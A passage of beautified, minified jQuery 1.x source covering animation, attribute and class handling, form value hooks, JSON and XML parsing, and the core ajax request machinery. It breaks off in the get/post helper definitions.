                return this.pos = t = this.options.duration ? p.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : Ve.propHooks._default.set(this), this
            }
        }, Ve.prototype.init.prototype = Ve.prototype, Ve.propHooks = {
            _default: {
                get: function (e) {
                    var t;
                    return null == e.elem[e.prop] || e.elem.style && null != e.elem.style[e.prop] ? (t = p.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0 : e.elem[e.prop]
                },
                set: function (e) {
                    p.fx.step[e.prop] ? p.fx.step[e.prop](e) : e.elem.style && (null != e.elem.style[p.cssProps[e.prop]] || p.cssHooks[e.prop]) ? p.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
                }
            }
        }, Ve.propHooks.scrollTop = Ve.propHooks.scrollLeft = {
            set: function (e) {
                e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
            }
        }, p.easing = {
            linear: function (e) {
                return e
            },
            swing: function (e) {
                return .5 - Math.cos(e * Math.PI) / 2
            }
        }, p.fx = Ve.prototype.init, p.fx.step = {};
        var Ge, Je, Ze = /^(?:toggle|show|hide)$/,
            Qe = new RegExp("^(?:([+-])=|)(" + W + ")([a-z%]*)$", "i"),
            Ke = /queueHooks$/,
            et = [function (e, t, n) {
                var o, i, r, a, s, l, c, d = this,
                    f = {},
                    h = e.style,
                    m = e.nodeType && _(e),
                    g = p._data(e, "fxshow");
                for (o in n.queue || (null == (s = p._queueHooks(e, "fx")).unqueued && (s.unqueued = 0, l = s.empty.fire, s.empty.fire = function () {
                    s.unqueued || l()
                }), s.unqueued++, d.always((function () {
                    d.always((function () {
                        s.unqueued--, p.queue(e, "fx").length || s.empty.fire()
                    }))
                }))), 1 === e.nodeType && ("height" in t || "width" in t) && (n.overflow = [h.overflow, h.overflowX, h.overflowY], c = p.css(e, "display"), "inline" === ("none" === c ? p._data(e, "olddisplay") || Ne(e.nodeName) : c) && "none" === p.css(e, "float") && (u.inlineBlockNeedsLayout && "inline" !== Ne(e.nodeName) ? h.zoom = 1 : h.display = "inline-block")), n.overflow && (h.overflow = "hidden", u.shrinkWrapBlocks() || d.always((function () {
                    h.overflow = n.overflow[0], h.overflowX = n.overflow[1], h.overflowY = n.overflow[2]
                }))), t)
                    if (i = t[o], Ze.exec(i)) {
                        if (delete t[o], r = r || "toggle" === i, i === (m ? "hide" : "show")) {
                            if ("show" !== i || !g || void 0 === g[o]) continue;
                            m = !0
                        }
                        f[o] = g && g[o] || p.style(e, o)
                    } else c = void 0;
                if (p.isEmptyObject(f)) "inline" === ("none" === c ? Ne(e.nodeName) : c) && (h.display = c);
                else
                    for (o in g ? "hidden" in g && (m = g.hidden) : g = p._data(e, "fxshow", {}), r && (g.hidden = !m), m ? p(e).show() : d.done((function () {
                        p(e).hide()
                    })), d.done((function () {
                        var t;
                        for (t in p._removeData(e, "fxshow"), f) p.style(e, t, f[t])
                    })), f) a = it(m ? g[o] : 0, o, d), o in g || (g[o] = a.start, m && (a.end = a.start, a.start = "width" === o || "height" === o ? 1 : 0))
            }],
            tt = {
                "*": [function (e, t) {
                    var n = this.createTween(e, t),
                        o = n.cur(),
                        i = Qe.exec(t),
                        r = i && i[3] || (p.cssNumber[e] ? "" : "px"),
                        a = (p.cssNumber[e] || "px" !== r && +o) && Qe.exec(p.css(n.elem, e)),
                        s = 1,
                        l = 20;
                    if (a && a[3] !== r) {
                        r = r || a[3], i = i || [], a = +o || 1;
                        do {
                            a /= s = s || ".5", p.style(n.elem, e, a + r)
                        } while (s !== (s = n.cur() / o) && 1 !== s && --l)
                    }
                    return i && (a = n.start = +a || +o || 0, n.unit = r, n.end = i[1] ? a + (i[1] + 1) * i[2] : +i[2]), n
                }]
            };

        function nt() {
            return setTimeout((function () {
                Ge = void 0
            })), Ge = p.now()
        }

        function ot(e, t) {
            var n, o = {
                height: e
            },
                i = 0;
            for (t = t ? 1 : 0; 4 > i; i += 2 - t) o["margin" + (n = R[i])] = o["padding" + n] = e;
            return t && (o.opacity = o.width = e), o
        }

        function it(e, t, n) {
            for (var o, i = (tt[t] || []).concat(tt["*"]), r = 0, a = i.length; a > r; r++)
                if (o = i[r].call(n, t, e)) return o
        }

        function rt(e, t, n) {
            var o, i, r = 0,
                a = et.length,
                s = p.Deferred().always((function () {
                    delete l.elem
                })),
                l = function () {
                    if (i) return !1;
                    for (var t = Ge || nt(), n = Math.max(0, c.startTime + c.duration - t), o = 1 - (n / c.duration || 0), r = 0, a = c.tweens.length; a > r; r++) c.tweens[r].run(o);
                    return s.notifyWith(e, [c, o, n]), 1 > o && a ? n : (s.resolveWith(e, [c]), !1)
                },
                c = s.promise({
                    elem: e,
                    props: p.extend({}, t),
                    opts: p.extend(!0, {
                        specialEasing: {}
                    }, n),
                    originalProperties: t,
                    originalOptions: n,
                    startTime: Ge || nt(),
                    duration: n.duration,
                    tweens: [],
                    createTween: function (t, n) {
                        var o = p.Tween(e, c.opts, t, n, c.opts.specialEasing[t] || c.opts.easing);
                        return c.tweens.push(o), o
                    },
                    stop: function (t) {
                        var n = 0,
                            o = t ? c.tweens.length : 0;
                        if (i) return this;
                        for (i = !0; o > n; n++) c.tweens[n].run(1);
                        return t ? s.resolveWith(e, [c, t]) : s.rejectWith(e, [c, t]), this
                    }
                }),
                u = c.props;
            for (function (e, t) {
                var n, o, i, r, a;
                for (n in e)
                    if (i = t[o = p.camelCase(n)], r = e[n], p.isArray(r) && (i = r[1], r = e[n] = r[0]), n !== o && (e[o] = r, delete e[n]), (a = p.cssHooks[o]) && "expand" in a)
                        for (n in r = a.expand(r), delete e[o], r) n in e || (e[n] = r[n], t[n] = i);
                    else t[o] = i
            }(u, c.opts.specialEasing); a > r; r++)
                if (o = et[r].call(c, e, u, c.opts)) return o;
            return p.map(u, it, c), p.isFunction(c.opts.start) && c.opts.start.call(e, c), p.fx.timer(p.extend(l, {
                elem: e,
                anim: c,
                queue: c.opts.queue
            })), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always)
        }
        p.Animation = p.extend(rt, {
            tweener: function (e, t) {
                p.isFunction(e) ? (t = e, e = ["*"]) : e = e.split(" ");
                for (var n, o = 0, i = e.length; i > o; o++) n = e[o], tt[n] = tt[n] || [], tt[n].unshift(t)
            },
            prefilter: function (e, t) {
                t ? et.unshift(e) : et.push(e)
            }
        }), p.speed = function (e, t, n) {
            var o = e && "object" == typeof e ? p.extend({}, e) : {
                complete: n || !n && t || p.isFunction(e) && e,
                duration: e,
                easing: n && t || t && !p.isFunction(t) && t
            };
            return o.duration = p.fx.off ? 0 : "number" == typeof o.duration ? o.duration : o.duration in p.fx.speeds ? p.fx.speeds[o.duration] : p.fx.speeds._default, (null == o.queue || !0 === o.queue) && (o.queue = "fx"), o.old = o.complete, o.complete = function () {
                p.isFunction(o.old) && o.old.call(this), o.queue && p.dequeue(this, o.queue)
            }, o
        }, p.fn.extend({
            fadeTo: function (e, t, n, o) {
                return this.filter(_).css("opacity", 0).show().end().animate({
                    opacity: t
                }, e, n, o)
            },
            animate: function (e, t, n, o) {
                var i = p.isEmptyObject(e),
                    r = p.speed(t, n, o),
                    a = function () {
                        var t = rt(this, p.extend({}, e), r);
                        (i || p._data(this, "finish")) && t.stop(!0)
                    };
                return a.finish = a, i || !1 === r.queue ? this.each(a) : this.queue(r.queue, a)
            },
            stop: function (e, t, n) {
                var o = function (e) {
                    var t = e.stop;
                    delete e.stop, t(n)
                };
                return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each((function () {
                    var t = !0,
                        i = null != e && e + "queueHooks",
                        r = p.timers,
                        a = p._data(this);
                    if (i) a[i] && a[i].stop && o(a[i]);
                    else
                        for (i in a) a[i] && a[i].stop && Ke.test(i) && o(a[i]);
                    for (i = r.length; i--;) r[i].elem !== this || null != e && r[i].queue !== e || (r[i].anim.stop(n), t = !1, r.splice(i, 1));
                    (t || !n) && p.dequeue(this, e)
                }))
            },
            finish: function (e) {
                return !1 !== e && (e = e || "fx"), this.each((function () {
                    var t, n = p._data(this),
                        o = n[e + "queue"],
                        i = n[e + "queueHooks"],
                        r = p.timers,
                        a = o ? o.length : 0;
                    for (n.finish = !0, p.queue(this, e, []), i && i.stop && i.stop.call(this, !0), t = r.length; t--;) r[t].elem === this && r[t].queue === e && (r[t].anim.stop(!0), r.splice(t, 1));
                    for (t = 0; a > t; t++) o[t] && o[t].finish && o[t].finish.call(this);
                    delete n.finish
                }))
            }
        }), p.each(["toggle", "show", "hide"], (function (e, t) {
            var n = p.fn[t];
            p.fn[t] = function (e, o, i) {
                return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(ot(t, !0), e, o, i)
            }
        })), p.each({
            slideDown: ot("show"),
            slideUp: ot("hide"),
            slideToggle: ot("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, (function (e, t) {
            p.fn[e] = function (e, n, o) {
                return this.animate(t, e, n, o)
            }
        })), p.timers = [], p.fx.tick = function () {
            var e, t = p.timers,
                n = 0;
            for (Ge = p.now(); n < t.length; n++)(e = t[n])() || t[n] !== e || t.splice(n--, 1);
            t.length || p.fx.stop(), Ge = void 0
        }, p.fx.timer = function (e) {
            p.timers.push(e), e() ? p.fx.start() : p.timers.pop()
        }, p.fx.interval = 13, p.fx.start = function () {
            Je || (Je = setInterval(p.fx.tick, p.fx.interval))
        }, p.fx.stop = function () {
            clearInterval(Je), Je = null
        }, p.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        }, p.fn.delay = function (e, t) {
            return e = p.fx && p.fx.speeds[e] || e, t = t || "fx", this.queue(t, (function (t, n) {
                var o = setTimeout(t, e);
                n.stop = function () {
                    clearTimeout(o)
                }
            }))
        },
            function () {
                var e, t, n, o, i;
                (t = E.createElement("div")).setAttribute("className", "t"), t.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", o = t.getElementsByTagName("a")[0], i = (n = E.createElement("select")).appendChild(E.createElement("option")), e = t.getElementsByTagName("input")[0], o.style.cssText = "top:1px", u.getSetAttribute = "t" !== t.className, u.style = /top/.test(o.getAttribute("style")), u.hrefNormalized = "/a" === o.getAttribute("href"), u.checkOn = !!e.value, u.optSelected = i.selected, u.enctype = !!E.createElement("form").enctype, n.disabled = !0, u.optDisabled = !i.disabled, (e = E.createElement("input")).setAttribute("value", ""), u.input = "" === e.getAttribute("value"), e.value = "t", e.setAttribute("type", "radio"), u.radioValue = "t" === e.value
            }();
        var at = /\r/g;
        p.fn.extend({
            val: function (e) {
                var t, n, o, i = this[0];
                return arguments.length ? (o = p.isFunction(e), this.each((function (n) {
                    var i;
                    1 === this.nodeType && (null == (i = o ? e.call(this, n, p(this).val()) : e) ? i = "" : "number" == typeof i ? i += "" : p.isArray(i) && (i = p.map(i, (function (e) {
                        return null == e ? "" : e + ""
                    }))), (t = p.valHooks[this.type] || p.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, i, "value") || (this.value = i))
                }))) : i ? (t = p.valHooks[i.type] || p.valHooks[i.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(i, "value")) ? n : "string" == typeof (n = i.value) ? n.replace(at, "") : null == n ? "" : n : void 0
            }
        }), p.extend({
            valHooks: {
                option: {
                    get: function (e) {
                        var t = p.find.attr(e, "value");
                        return null != t ? t : p.trim(p.text(e))
                    }
                },
                select: {
                    get: function (e) {
                        for (var t, n, o = e.options, i = e.selectedIndex, r = "select-one" === e.type || 0 > i, a = r ? null : [], s = r ? i + 1 : o.length, l = 0 > i ? s : r ? i : 0; s > l; l++)
                            if (!(!(n = o[l]).selected && l !== i || (u.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && p.nodeName(n.parentNode, "optgroup"))) {
                                if (t = p(n).val(), r) return t;
                                a.push(t)
                            } return a
                    },
                    set: function (e, t) {
                        for (var n, o, i = e.options, r = p.makeArray(t), a = i.length; a--;)
                            if (o = i[a], p.inArray(p.valHooks.option.get(o), r) >= 0) try {
                                o.selected = n = !0
                            } catch (e) {
                                o.scrollHeight
                            } else o.selected = !1;
                        return n || (e.selectedIndex = -1), i
                    }
                }
            }
        }), p.each(["radio", "checkbox"], (function () {
            p.valHooks[this] = {
                set: function (e, t) {
                    return p.isArray(t) ? e.checked = p.inArray(p(e).val(), t) >= 0 : void 0
                }
            }, u.checkOn || (p.valHooks[this].get = function (e) {
                return null === e.getAttribute("value") ? "on" : e.value
            })
        }));
        var st, lt, ct = p.expr.attrHandle,
            ut = /^(?:checked|selected)$/i,
            dt = u.getSetAttribute,
            pt = u.input;
        p.fn.extend({
            attr: function (e, t) {
                return U(this, p.attr, e, t, arguments.length > 1)
            },
            removeAttr: function (e) {
                return this.each((function () {
                    p.removeAttr(this, e)
                }))
            }
        }), p.extend({
            attr: function (e, t, n) {
                var o, i, r = e.nodeType;
                if (e && 3 !== r && 8 !== r && 2 !== r) return typeof e.getAttribute === j ? p.prop(e, t, n) : (1 === r && p.isXMLDoc(e) || (t = t.toLowerCase(), o = p.attrHooks[t] || (p.expr.match.bool.test(t) ? lt : st)), void 0 === n ? o && "get" in o && null !== (i = o.get(e, t)) ? i : null == (i = p.find.attr(e, t)) ? void 0 : i : null !== n ? o && "set" in o && void 0 !== (i = o.set(e, n, t)) ? i : (e.setAttribute(t, n + ""), n) : void p.removeAttr(e, t))
            },
            removeAttr: function (e, t) {
                var n, o, i = 0,
                    r = t && t.match(I);
                if (r && 1 === e.nodeType)
                    for (; n = r[i++];) o = p.propFix[n] || n, p.expr.match.bool.test(n) ? pt && dt || !ut.test(n) ? e[o] = !1 : e[p.camelCase("default-" + n)] = e[o] = !1 : p.attr(e, n, ""), e.removeAttribute(dt ? n : o)
            },
            attrHooks: {
                type: {
                    set: function (e, t) {
                        if (!u.radioValue && "radio" === t && p.nodeName(e, "input")) {
                            var n = e.value;
                            return e.setAttribute("type", t), n && (e.value = n), t
                        }
                    }
                }
            }
        }), lt = {
            set: function (e, t, n) {
                return !1 === t ? p.removeAttr(e, n) : pt && dt || !ut.test(n) ? e.setAttribute(!dt && p.propFix[n] || n, n) : e[p.camelCase("default-" + n)] = e[n] = !0, n
            }
        }, p.each(p.expr.match.bool.source.match(/\w+/g), (function (e, t) {
            var n = ct[t] || p.find.attr;
            ct[t] = pt && dt || !ut.test(t) ? function (e, t, o) {
                var i, r;
                return o || (r = ct[t], ct[t] = i, i = null != n(e, t, o) ? t.toLowerCase() : null, ct[t] = r), i
            } : function (e, t, n) {
                return n ? void 0 : e[p.camelCase("default-" + t)] ? t.toLowerCase() : null
            }
        })), pt && dt || (p.attrHooks.value = {
            set: function (e, t, n) {
                return p.nodeName(e, "input") ? void (e.defaultValue = t) : st && st.set(e, t, n)
            }
        }), dt || (st = {
            set: function (e, t, n) {
                var o = e.getAttributeNode(n);
                return o || e.setAttributeNode(o = e.ownerDocument.createAttribute(n)), o.value = t += "", "value" === n || t === e.getAttribute(n) ? t : void 0
            }
        }, ct.id = ct.name = ct.coords = function (e, t, n) {
            var o;
            return n ? void 0 : (o = e.getAttributeNode(t)) && "" !== o.value ? o.value : null
        }, p.valHooks.button = {
            get: function (e, t) {
                var n = e.getAttributeNode(t);
                return n && n.specified ? n.value : void 0
            },
            set: st.set
        }, p.attrHooks.contenteditable = {
            set: function (e, t, n) {
                st.set(e, "" !== t && t, n)
            }
        }, p.each(["width", "height"], (function (e, t) {
            p.attrHooks[t] = {
                set: function (e, n) {
                    return "" === n ? (e.setAttribute(t, "auto"), n) : void 0
                }
            }
        }))), u.style || (p.attrHooks.style = {
            get: function (e) {
                return e.style.cssText || void 0
            },
            set: function (e, t) {
                return e.style.cssText = t + ""
            }
        });
        var ft = /^(?:input|select|textarea|button|object)$/i,
            ht = /^(?:a|area)$/i;
        p.fn.extend({
            prop: function (e, t) {
                return U(this, p.prop, e, t, arguments.length > 1)
            },
            removeProp: function (e) {
                return e = p.propFix[e] || e, this.each((function () {
                    try {
                        this[e] = void 0, delete this[e]
                    } catch (e) { }
                }))
            }
        }), p.extend({
            propFix: {
                for: "htmlFor",
                class: "className"
            },
            prop: function (e, t, n) {
                var o, i, r = e.nodeType;
                if (e && 3 !== r && 8 !== r && 2 !== r) return (1 !== r || !p.isXMLDoc(e)) && (t = p.propFix[t] || t, i = p.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (o = i.set(e, n, t)) ? o : e[t] = n : i && "get" in i && null !== (o = i.get(e, t)) ? o : e[t]
            },
            propHooks: {
                tabIndex: {
                    get: function (e) {
                        var t = p.find.attr(e, "tabindex");
                        return t ? parseInt(t, 10) : ft.test(e.nodeName) || ht.test(e.nodeName) && e.href ? 0 : -1
                    }
                }
            }
        }), u.hrefNormalized || p.each(["href", "src"], (function (e, t) {
            p.propHooks[t] = {
                get: function (e) {
                    return e.getAttribute(t, 4)
                }
            }
        })), u.optSelected || (p.propHooks.selected = {
            get: function (e) {
                var t = e.parentNode;
                return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
            }
        }), p.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], (function () {
            p.propFix[this.toLowerCase()] = this
        })), u.enctype || (p.propFix.enctype = "encoding");
        var mt = /[\t\r\n\f]/g;
        p.fn.extend({
            addClass: function (e) {
                var t, n, o, i, r, a, s = 0,
                    l = this.length,
                    c = "string" == typeof e && e;
                if (p.isFunction(e)) return this.each((function (t) {
                    p(this).addClass(e.call(this, t, this.className))
                }));
                if (c)
                    for (t = (e || "").match(I) || []; l > s; s++)
                        if (o = 1 === (n = this[s]).nodeType && (n.className ? (" " + n.className + " ").replace(mt, " ") : " ")) {
                            for (r = 0; i = t[r++];) o.indexOf(" " + i + " ") < 0 && (o += i + " ");
                            a = p.trim(o), n.className !== a && (n.className = a)
                        } return this
            },
            removeClass: function (e) {
                var t, n, o, i, r, a, s = 0,
                    l = this.length,
                    c = 0 === arguments.length || "string" == typeof e && e;
                if (p.isFunction(e)) return this.each((function (t) {
                    p(this).removeClass(e.call(this, t, this.className))
                }));
                if (c)
                    for (t = (e || "").match(I) || []; l > s; s++)
                        if (o = 1 === (n = this[s]).nodeType && (n.className ? (" " + n.className + " ").replace(mt, " ") : "")) {
                            for (r = 0; i = t[r++];)
                                for (; o.indexOf(" " + i + " ") >= 0;) o = o.replace(" " + i + " ", " ");
                            a = e ? p.trim(o) : "", n.className !== a && (n.className = a)
                        } return this
            },
            toggleClass: function (e, t) {
                var n = typeof e;
                return "boolean" == typeof t && "string" === n ? t ? this.addClass(e) : this.removeClass(e) : this.each(p.isFunction(e) ? function (n) {
                    p(this).toggleClass(e.call(this, n, this.className, t), t)
                } : function () {
                    if ("string" === n)
                        for (var t, o = 0, i = p(this), r = e.match(I) || []; t = r[o++];) i.hasClass(t) ? i.removeClass(t) : i.addClass(t);
                    else (n === j || "boolean" === n) && (this.className && p._data(this, "__className__", this.className), this.className = this.className || !1 === e ? "" : p._data(this, "__className__") || "")
                })
            },
            hasClass: function (e) {
                for (var t = " " + e + " ", n = 0, o = this.length; o > n; n++)
                    if (1 === this[n].nodeType && (" " + this[n].className + " ").replace(mt, " ").indexOf(t) >= 0) return !0;
                return !1
            }
        }), p.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), (function (e, t) {
            p.fn[t] = function (e, n) {
                return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t)
            }
        })), p.fn.extend({
            hover: function (e, t) {
                return this.mouseenter(e).mouseleave(t || e)
            },
            bind: function (e, t, n) {
                return this.on(e, null, t, n)
            },
            unbind: function (e, t) {
                return this.off(e, null, t)
            },
            delegate: function (e, t, n, o) {
                return this.on(t, e, n, o)
            },
            undelegate: function (e, t, n) {
                return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
            }
        });
        var gt = p.now(),
            vt = /\?/,
            yt = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
        p.parseJSON = function (t) {
            if (e.JSON && e.JSON.parse) return e.JSON.parse(t + "");
            var n, o = null,
                i = p.trim(t + "");
            return i && !p.trim(i.replace(yt, (function (e, t, i, r) {
                return n && t && (o = 0), 0 === o ? e : (n = i || t, o += !r - !i, "")
            }))) ? Function("return " + i)() : p.error("Invalid JSON: " + t)
        }, p.parseXML = function (t) {
            var n;
            if (!t || "string" != typeof t) return null;
            try {
                e.DOMParser ? n = (new DOMParser).parseFromString(t, "text/xml") : ((n = new ActiveXObject("Microsoft.XMLDOM")).async = "false", n.loadXML(t))
            } catch (e) {
                n = void 0
            }
            return n && n.documentElement && !n.getElementsByTagName("parsererror").length || p.error("Invalid XML: " + t), n
        };
        var bt, xt, wt = /#.*$/,
            Ct = /([?&])_=[^&]*/,
            Tt = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
            Et = /^(?:GET|HEAD)$/,
            kt = /^\/\//,
            St = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
            Lt = {},
            Nt = {},
            Dt = "*/".concat("*");
        try {
            xt = location.href
        } catch (e) {
            (xt = E.createElement("a")).href = "", xt = xt.href
        }

        function It(e) {
            return function (t, n) {
                "string" != typeof t && (n = t, t = "*");
                var o, i = 0,
                    r = t.toLowerCase().match(I) || [];
                if (p.isFunction(n))
                    for (; o = r[i++];) "+" === o.charAt(0) ? (o = o.slice(1) || "*", (e[o] = e[o] || []).unshift(n)) : (e[o] = e[o] || []).push(n)
            }
        }

        function At(e, t, n, o) {
            var i = {},
                r = e === Nt;

            function a(s) {
                var l;
                return i[s] = !0, p.each(e[s] || [], (function (e, s) {
                    var c = s(t, n, o);
                    return "string" != typeof c || r || i[c] ? r ? !(l = c) : void 0 : (t.dataTypes.unshift(c), a(c), !1)
                })), l
            }
            return a(t.dataTypes[0]) || !i["*"] && a("*")
        }

        function $t(e, t) {
            var n, o, i = p.ajaxSettings.flatOptions || {};
            for (o in t) void 0 !== t[o] && ((i[o] ? e : n || (n = {}))[o] = t[o]);
            return n && p.extend(!0, e, n), e
        }
        bt = St.exec(xt.toLowerCase()) || [], p.extend({
            active: 0,
            lastModified: {},
            etag: {},
            ajaxSettings: {
                url: xt,
                type: "GET",
                isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(bt[1]),
                global: !0,
                processData: !0,
                async: !0,
                contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                accepts: {
                    "*": Dt,
                    text: "text/plain",
                    html: "text/html",
                    xml: "application/xml, text/xml",
                    json: "application/json, text/javascript"
                },
                contents: {
                    xml: /xml/,
                    html: /html/,
                    json: /json/
                },
                responseFields: {
                    xml: "responseXML",
                    text: "responseText",
                    json: "responseJSON"
                },
                converters: {
                    "* text": String,
                    "text html": !0,
                    "text json": p.parseJSON,
                    "text xml": p.parseXML
                },
                flatOptions: {
                    url: !0,
                    context: !0
                }
            },
            ajaxSetup: function (e, t) {
                return t ? $t($t(e, p.ajaxSettings), t) : $t(p.ajaxSettings, e)
            },
            ajaxPrefilter: It(Lt),
            ajaxTransport: It(Nt),
            ajax: function (e, t) {
                "object" == typeof e && (t = e, e = void 0), t = t || {};
                var n, o, i, r, a, s, l, c, u = p.ajaxSetup({}, t),
                    d = u.context || u,
                    f = u.context && (d.nodeType || d.jquery) ? p(d) : p.event,
                    h = p.Deferred(),
                    m = p.Callbacks("once memory"),
                    g = u.statusCode || {},
                    v = {},
                    y = {},
                    b = 0,
                    x = "canceled",
                    w = {
                        readyState: 0,
                        getResponseHeader: function (e) {
                            var t;
                            if (2 === b) {
                                if (!c)
                                    for (c = {}; t = Tt.exec(r);) c[t[1].toLowerCase()] = t[2];
                                t = c[e.toLowerCase()]
                            }
                            return null == t ? null : t
                        },
                        getAllResponseHeaders: function () {
                            return 2 === b ? r : null
                        },
                        setRequestHeader: function (e, t) {
                            var n = e.toLowerCase();
                            return b || (e = y[n] = y[n] || e, v[e] = t), this
                        },
                        overrideMimeType: function (e) {
                            return b || (u.mimeType = e), this
                        },
                        statusCode: function (e) {
                            var t;
                            if (e)
                                if (2 > b)
                                    for (t in e) g[t] = [g[t], e[t]];
                                else w.always(e[w.status]);
                            return this
                        },
                        abort: function (e) {
                            var t = e || x;
                            return l && l.abort(t), C(0, t), this
                        }
                    };
                if (h.promise(w).complete = m.add, w.success = w.done, w.error = w.fail, u.url = ((e || u.url || xt) + "").replace(wt, "").replace(kt, bt[1] + "//"), u.type = t.method || t.type || u.method || u.type, u.dataTypes = p.trim(u.dataType || "*").toLowerCase().match(I) || [""], null == u.crossDomain && (n = St.exec(u.url.toLowerCase()), u.crossDomain = !(!n || n[1] === bt[1] && n[2] === bt[2] && (n[3] || ("http:" === n[1] ? "80" : "443")) === (bt[3] || ("http:" === bt[1] ? "80" : "443")))), u.data && u.processData && "string" != typeof u.data && (u.data = p.param(u.data, u.traditional)), At(Lt, u, t, w), 2 === b) return w;
                for (o in (s = p.event && u.global) && 0 == p.active++ && p.event.trigger("ajaxStart"), u.type = u.type.toUpperCase(), u.hasContent = !Et.test(u.type), i = u.url, u.hasContent || (u.data && (i = u.url += (vt.test(i) ? "&" : "?") + u.data, delete u.data), !1 === u.cache && (u.url = Ct.test(i) ? i.replace(Ct, "$1_=" + gt++) : i + (vt.test(i) ? "&" : "?") + "_=" + gt++)), u.ifModified && (p.lastModified[i] && w.setRequestHeader("If-Modified-Since", p.lastModified[i]), p.etag[i] && w.setRequestHeader("If-None-Match", p.etag[i])), (u.data && u.hasContent && !1 !== u.contentType || t.contentType) && w.setRequestHeader("Content-Type", u.contentType), w.setRequestHeader("Accept", u.dataTypes[0] && u.accepts[u.dataTypes[0]] ? u.accepts[u.dataTypes[0]] + ("*" !== u.dataTypes[0] ? ", " + Dt + "; q=0.01" : "") : u.accepts["*"]), u.headers) w.setRequestHeader(o, u.headers[o]);
                if (u.beforeSend && (!1 === u.beforeSend.call(d, w, u) || 2 === b)) return w.abort();
                for (o in x = "abort", {
                    success: 1,
                    error: 1,
                    complete: 1
                }) w[o](u[o]);
                if (l = At(Nt, u, t, w)) {
                    w.readyState = 1, s && f.trigger("ajaxSend", [w, u]), u.async && u.timeout > 0 && (a = setTimeout((function () {
                        w.abort("timeout")
                    }), u.timeout));
                    try {
                        b = 1, l.send(v, C)
                    } catch (e) {
                        if (!(2 > b)) throw e;
                        C(-1, e)
                    }
                } else C(-1, "No Transport");

                function C(e, t, n, o) {
                    var c, v, y, x, C, T = t;
                    2 !== b && (b = 2, a && clearTimeout(a), l = void 0, r = o || "", w.readyState = e > 0 ? 4 : 0, c = e >= 200 && 300 > e || 304 === e, n && (x = function (e, t, n) {
                        for (var o, i, r, a, s = e.contents, l = e.dataTypes;
                            "*" === l[0];) l.shift(), void 0 === i && (i = e.mimeType || t.getResponseHeader("Content-Type"));
                        if (i)
                            for (a in s)
                                if (s[a] && s[a].test(i)) {
                                    l.unshift(a);
                                    break
                                } if (l[0] in n) r = l[0];
                        else {
                            for (a in n) {
                                if (!l[0] || e.converters[a + " " + l[0]]) {
                                    r = a;
                                    break
                                }
                                o || (o = a)
                            }
                            r = r || o
                        }
                        return r ? (r !== l[0] && l.unshift(r), n[r]) : void 0
                    }(u, w, n)), x = function (e, t, n, o) {
                        var i, r, a, s, l, c = {},
                            u = e.dataTypes.slice();
                        if (u[1])
                            for (a in e.converters) c[a.toLowerCase()] = e.converters[a];
                        for (r = u.shift(); r;)
                            if (e.responseFields[r] && (n[e.responseFields[r]] = t), !l && o && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = r, r = u.shift())
                                if ("*" === r) r = l;
                                else if ("*" !== l && l !== r) {
                                    if (!(a = c[l + " " + r] || c["* " + r]))
                                        for (i in c)
                                            if ((s = i.split(" "))[1] === r && (a = c[l + " " + s[0]] || c["* " + s[0]])) {
                                                !0 === a ? a = c[i] : !0 !== c[i] && (r = s[0], u.unshift(s[1]));
                                                break
                                            } if (!0 !== a)
                                        if (a && e.throws) t = a(t);
                                        else try {
                                            t = a(t)
                                        } catch (e) {
                                            return {
                                                state: "parsererror",
                                                error: a ? e : "No conversion from " + l + " to " + r
                                            }
                                        }
                                }
                        return {
                            state: "success",
                            data: t
                        }
                    }(u, x, w, c), c ? (u.ifModified && ((C = w.getResponseHeader("Last-Modified")) && (p.lastModified[i] = C), (C = w.getResponseHeader("etag")) && (p.etag[i] = C)), 204 === e || "HEAD" === u.type ? T = "nocontent" : 304 === e ? T = "notmodified" : (T = x.state, v = x.data, c = !(y = x.error))) : (y = T, (e || !T) && (T = "error", 0 > e && (e = 0))), w.status = e, w.statusText = (t || T) + "", c ? h.resolveWith(d, [v, T, w]) : h.rejectWith(d, [w, T, y]), w.statusCode(g), g = void 0, s && f.trigger(c ? "ajaxSuccess" : "ajaxError", [w, u, c ? v : y]), m.fireWith(d, [w, T]), s && (f.trigger("ajaxComplete", [w, u]), --p.active || p.event.trigger("ajaxStop")))
                }
                return w
            },
            getJSON: function (e, t, n) {
                return p.get(e, t, n, "json")
            },
            getScript: function (e, t) {
                return p.get(e, void 0, t, "script")
            }
        }), p.each(["get", "post"], (function (e, t) {
            p[t] = function (e, n, o, i) {
